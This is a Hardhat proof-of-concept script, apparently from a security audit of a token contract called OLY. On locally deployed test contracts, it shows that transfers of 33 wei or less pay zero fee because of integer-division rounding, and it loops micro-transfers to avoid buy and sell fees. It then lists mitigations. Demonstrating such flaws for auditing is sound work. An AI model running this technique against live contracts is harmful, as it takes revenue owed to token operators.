/**
 * CVE-OLY-008: Precision-Based Fee Bypass Exploit
 * 
 * MAJOR VULNERABILITY PROOF OF CONCEPT
 * 
 * This exploit demonstrates how small transfer amounts can bypass fees
 * due to integer division rounding, enabling systematic fee avoidance
 * through micro-transactions.
 * 
 * ⚠️ FOR TESTNET USE ONLY - DO NOT RUN ON MAINNET
 */

const { ethers } = require("hardhat");
const { expect } = require("chai");

async function main() {
    console.log("🟠 CVE-OLY-008: Precision-Based Fee Bypass Exploit");
    console.log("=" .repeat(60));
    
    // Get signers
    const [deployer, attacker, normalUser, mainPair] = await ethers.getSigners();
    
    console.log("👤 Deployer:", deployer.address);
    console.log("🏴‍☠️ Attacker:", attacker.address);
    console.log("👤 Normal User:", normalUser.address);
    console.log("🏪 Main Pair:", mainPair.address);
    console.log("");

    // Step 1: Deploy mock fee receiver
    console.log("📋 Step 1: Deploying Mock Fee Receiver...");
    
    const MockFeeReceiver = await ethers.getContractFactory("MockFeeReceiver");
    const mockReceiver = await MockFeeReceiver.deploy();
    await mockReceiver.waitForDeployment();
    
    console.log("📡 Mock Fee Receiver deployed at:", await mockReceiver.getAddress());

    // Step 2: Deploy OLY contract
    console.log("\n📋 Step 2: Deploying OLY Contract...");
    
    const OLY = await ethers.getContractFactory("OLY");
    const oly = await OLY.deploy(await mockReceiver.getAddress(), 3000); // 3% buy fee
    await oly.waitForDeployment();
    
    console.log("🪙 OLY Contract deployed at:", await oly.getAddress());
    
    const buyFeeRatio = await oly.buyFeeRatio();
    const sellFeeRatio = await oly.feeRatio();
    const precision = await oly.PRECISION();
    
    console.log("💸 Buy Fee Ratio:", buyFeeRatio.toString(), "(3%)");
    console.log("💸 Sell Fee Ratio:", sellFeeRatio.toString(), "(3%)");
    console.log("🎯 Precision:", precision.toString());

    // Step 3: Setup contract state
    console.log("\n📋 Step 3: Setting up Contract State...");
    
    await oly.setMainPair(mainPair.address);
    const MINT_ROLE = await oly.MINT();
    await oly.grantRole(MINT_ROLE, deployer.address);
    
    // Mint tokens for testing
    const mintAmount = ethers.parseUnits("1000000", 9); // Large amount for testing
    await oly.mint(attacker.address, mintAmount);
    await oly.mint(normalUser.address, mintAmount);
    await oly.mint(mainPair.address, mintAmount);
    
    console.log("✅ Main pair set to:", mainPair.address);
    console.log("✅ Tokens minted for testing");

    // Step 4: Analyze fee calculation precision
    console.log("\n📋 Step 4: Analyzing Fee Calculation Precision...");
    
    console.log("🧮 Fee Calculation Formula: fee = amount * feeRatio / PRECISION");
    console.log("🧮 Buy Fee: fee = amount * 3000 / 100000");
    console.log("🧮 Sell Fee: fee = amount * 3000 / 100000");
    console.log("");
    
    // Find the threshold where fees become 0 due to rounding
    console.log("🔍 Finding precision bypass threshold...");
    
    let bypassThreshold = 0n;
    for (let amount = 1n; amount <= 100n; amount++) {
        const calculatedFee = amount * 3000n / 100000n;
        if (calculatedFee === 0n) {
            bypassThreshold = amount;
            console.log(`   Amount ${amount}: Fee = ${calculatedFee} (BYPASS!)`);
        } else {
            console.log(`   Amount ${amount}: Fee = ${calculatedFee}`);
            break;
        }
    }
    
    console.log("🎯 Bypass threshold found:", bypassThreshold.toString(), "wei");
    console.log("💀 Any amount ≤", bypassThreshold.toString(), "wei will pay 0 fees");

    // Step 5: Demonstrate normal fee collection
    console.log("\n📋 Step 5: Demonstrating Normal Fee Collection...");
    
    const normalAmount = ethers.parseUnits("1000", 9);
    const expectedNormalFee = normalAmount * 3000n / 100000n;
    
    console.log("💰 Normal transfer amount:", ethers.formatUnits(normalAmount, 9));
    console.log("🧮 Expected fee:", ethers.formatUnits(expectedNormalFee, 9));
    
    const initialFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const initialNormalUserBalance = await oly.balanceOf(normalUser.address);
    
    // Normal user buy transaction
    await oly.connect(mainPair).transfer(normalUser.address, normalAmount);
    
    const afterNormalFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const afterNormalUserBalance = await oly.balanceOf(normalUser.address);
    
    const normalFeeCollected = afterNormalFeeBalance - initialFeeBalance;
    const normalUserReceived = afterNormalUserBalance - initialNormalUserBalance;
    
    console.log("💸 Actual fee collected:", ethers.formatUnits(normalFeeCollected, 9));
    console.log("💰 User received:", ethers.formatUnits(normalUserReceived, 9));
    console.log("✅ Normal fee collection working as expected");

    // Step 6: Execute precision bypass exploit
    console.log("\n📋 Step 6: Executing Precision Bypass Exploit...");
    
    // Calculate optimal micro-transaction size
    const targetTransferAmount = ethers.parseUnits("1000", 9); // Same as normal transfer
    const microAmount = bypassThreshold; // Use maximum amount that pays 0 fees
    const numberOfMicroTransactions = targetTransferAmount / microAmount;
    
    console.log("🎯 Target total transfer:", ethers.formatUnits(targetTransferAmount, 9));
    console.log("🔬 Micro-transaction size:", microAmount.toString(), "wei");
    console.log("🔢 Number of micro-transactions needed:", numberOfMicroTransactions.toString());
    
    if (numberOfMicroTransactions > 1000n) {
        console.log("⚠️ Too many transactions needed, using smaller target for demo");
        // Use smaller target for practical demonstration
        const demoTarget = ethers.parseUnits("100", 9);
        const demoMicroTransactions = demoTarget / microAmount;
        console.log("🎯 Demo target:", ethers.formatUnits(demoTarget, 9));
        console.log("🔢 Demo micro-transactions:", demoMicroTransactions.toString());
    }
    
    // Execute micro-transaction attack
    console.log("\n🚀 Executing micro-transaction attack...");
    
    const attackStartFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const attackStartAttackerBalance = await oly.balanceOf(attacker.address);
    
    const microTransactionCount = 50n; // Practical number for demonstration
    const totalMicroAmount = microAmount * microTransactionCount;
    
    console.log("🔬 Executing", microTransactionCount.toString(), "micro-transactions...");
    console.log("💰 Total amount to transfer:", totalMicroAmount.toString(), "wei");
    console.log("🧮 Expected total fees if normal:", ethers.formatUnits((totalMicroAmount * 3000n / 100000n), 9));
    
    // Execute multiple micro-transactions
    for (let i = 0n; i < microTransactionCount; i++) {
        await oly.connect(mainPair).transfer(attacker.address, microAmount);
        
        if (i % 10n === 0n) {
            console.log(`   Completed ${i + 1n}/${microTransactionCount} micro-transactions`);
        }
    }
    
    const attackEndFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const attackEndAttackerBalance = await oly.balanceOf(attacker.address);
    
    const microAttackFeesCollected = attackEndFeeBalance - attackStartFeeBalance;
    const attackerMicroReceived = attackEndAttackerBalance - attackStartAttackerBalance;
    
    console.log("\n📊 Micro-transaction Attack Results:");
    console.log("💸 Total fees collected:", ethers.formatUnits(microAttackFeesCollected, 9));
    console.log("💰 Attacker received:", attackerMicroReceived.toString(), "wei");
    console.log("🎯 Total transferred:", totalMicroAmount.toString(), "wei");
    
    if (microAttackFeesCollected === 0n) {
        console.log("🚨 PRECISION BYPASS SUCCESSFUL: Zero fees collected!");
    }
    
    if (attackerMicroReceived === totalMicroAmount) {
        console.log("🚨 FULL AMOUNT RECEIVED: 100% of transfer amount received!");
    }

    // Step 7: Compare with equivalent normal transaction
    console.log("\n📋 Step 7: Comparing with Equivalent Normal Transaction...");
    
    const equivalentNormalAmount = totalMicroAmount;
    const expectedEquivalentFee = equivalentNormalAmount * 3000n / 100000n;
    
    console.log("🔄 Executing equivalent normal transaction...");
    console.log("💰 Amount:", equivalentNormalAmount.toString(), "wei");
    console.log("🧮 Expected fee:", expectedEquivalentFee.toString(), "wei");
    
    const beforeEquivalentFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    
    try {
        await oly.connect(mainPair).transfer(normalUser.address, equivalentNormalAmount);
        
        const afterEquivalentFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
        const equivalentFeeCollected = afterEquivalentFeeBalance - beforeEquivalentFeeBalance;
        
        console.log("💸 Actual fee from normal transaction:", equivalentFeeCollected.toString(), "wei");
        
        const feeDifference = equivalentFeeCollected - microAttackFeesCollected;
        console.log("📊 Fee difference (normal vs micro-attack):", feeDifference.toString(), "wei");
        
        if (feeDifference > 0n) {
            console.log("🚨 FEE AVOIDANCE CONFIRMED: Micro-transactions avoided", feeDifference.toString(), "wei in fees");
        }
        
    } catch (error) {
        console.log("❌ Equivalent normal transaction failed:", error.message);
        console.log("💡 This might indicate the amount is too small for normal processing");
    }

    // Step 8: Scale up the attack
    console.log("\n📋 Step 8: Scaling Up the Attack...");
    
    console.log("🚀 Demonstrating large-scale precision bypass...");
    
    // Use larger micro-transactions that still bypass fees
    const largerBypassAmount = 33n; // 33 wei should still result in 0 fee with 3% ratio
    const largerBypassFee = largerBypassAmount * 3000n / 100000n;
    
    console.log("🔬 Testing larger bypass amount:", largerBypassAmount.toString(), "wei");
    console.log("🧮 Calculated fee:", largerBypassFee.toString(), "wei");
    
    if (largerBypassFee === 0n) {
        console.log("✅ Larger amount still bypasses fees");
        
        const scaledAttackCount = 1000n;
        const scaledTotalAmount = largerBypassAmount * scaledAttackCount;
        const scaledExpectedFee = scaledTotalAmount * 3000n / 100000n;
        
        console.log("📈 Scaled attack simulation:");
        console.log("   • Micro-transactions:", scaledAttackCount.toString());
        console.log("   • Total amount:", ethers.formatUnits(scaledTotalAmount, 9));
        console.log("   • Fees avoided:", ethers.formatUnits(scaledExpectedFee, 9));
        console.log("   • Revenue loss: 100%");
        
    } else {
        console.log("❌ Larger amount would incur fees");
    }

    // Step 9: Test sell transactions
    console.log("\n📋 Step 9: Testing Sell Transaction Precision Bypass...");
    
    console.log("💰 Testing precision bypass on sell transactions...");
    
    const sellBypassAmount = bypassThreshold;
    const sellBypassCount = 30n;
    const totalSellBypassAmount = sellBypassAmount * sellBypassCount;
    
    const beforeSellBypassFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const beforeSellBypassMainPairBalance = await oly.balanceOf(mainPair.address);
    
    console.log("🔬 Executing", sellBypassCount.toString(), "micro sell transactions...");
    
    for (let i = 0n; i < sellBypassCount; i++) {
        await oly.connect(attacker).transfer(mainPair.address, sellBypassAmount);
    }
    
    const afterSellBypassFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const afterSellBypassMainPairBalance = await oly.balanceOf(mainPair.address);
    
    const sellBypassFeesCollected = afterSellBypassFeeBalance - beforeSellBypassFeeBalance;
    const mainPairSellReceived = afterSellBypassMainPairBalance - beforeSellBypassMainPairBalance;
    
    console.log("💸 Sell fees collected:", sellBypassFeesCollected.toString(), "wei");
    console.log("🏪 Main pair received:", mainPairSellReceived.toString(), "wei");
    console.log("🎯 Total sell amount:", totalSellBypassAmount.toString(), "wei");
    
    if (sellBypassFeesCollected === 0n) {
        console.log("🚨 SELL FEE BYPASS CONFIRMED: Zero sell fees collected!");
    }

    // Step 10: Impact Assessment
    console.log("\n📋 Step 10: Impact Assessment");
    console.log("=" .repeat(60));
    
    const totalFeesAvoided = microAttackFeesCollected + sellBypassFeesCollected;
    const totalAmountTransferred = totalMicroAmount + totalSellBypassAmount;
    const expectedTotalFees = (totalMicroAmount * 3000n / 100000n) + (totalSellBypassAmount * 3000n / 100000n);
    
    console.log("🔍 VULNERABILITY ANALYSIS:");
    console.log("   • Integer division rounds down to zero for small amounts");
    console.log("   • No minimum fee threshold implemented");
    console.log("   • Systematic exploitation through micro-transactions");
    console.log("   • Affects both buy and sell operations");
    console.log("");
    
    console.log("💰 FINANCIAL IMPACT:");
    console.log("   • Total amount transferred:", totalAmountTransferred.toString(), "wei");
    console.log("   • Expected fees:", ethers.formatUnits(expectedTotalFees, 9));
    console.log("   • Actual fees collected:", ethers.formatUnits(totalFeesAvoided, 9));
    console.log("   • Revenue loss:", ethers.formatUnits(expectedTotalFees - totalFeesAvoided, 9));
    console.log("   • Loss percentage: ~100% for micro-transactions");
    console.log("");
    
    console.log("🛡️ MITIGATION REQUIRED:");
    console.log("   • Implement minimum fee threshold (e.g., 1 wei minimum)");
    console.log("   • Add minimum transfer amount limits");
    console.log("   • Use higher precision arithmetic");
    console.log("   • Consider fee calculation rounding up instead of down");
    console.log("   • Implement rate limiting for micro-transactions");

    console.log("\n🟠 PRECISION BYPASS EXPLOIT COMPLETED");
    console.log("⚠️ This demonstrates systematic fee avoidance vulnerability");
}

// Mock Fee Receiver Contract Source
const mockFeeReceiverSource = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MockFeeReceiver {
    event SwapTriggered();
    
    function triggerSwapFeeForLottery() external {
        emit SwapTriggered();
    }
}
`;

// Export for use in other scripts
module.exports = {
    main,
    mockFeeReceiverSource
};

// Run if called directly
if (require.main === module) {
    main()
        .then(() => process.exit(0))
        .catch((error) => {
            console.error("💥 Exploit failed:", error);
            process.exit(1);
        });
}